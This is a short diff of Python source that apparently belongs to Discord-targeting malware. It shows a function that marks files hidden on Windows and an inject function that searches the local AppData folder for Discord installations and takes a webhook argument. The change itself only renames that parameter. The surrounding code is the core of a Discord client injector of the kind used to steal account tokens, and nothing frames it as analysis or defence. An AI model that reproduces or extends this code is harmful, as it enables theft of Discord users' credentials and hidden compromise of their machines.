@@ -589,7 +589,7 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject(webhook_url):
+def inject(webhook):
     appdata = os.getenv("localappdata")
     for _dir in os.listdir(appdata):
         if 'discord' in _dir.lower():
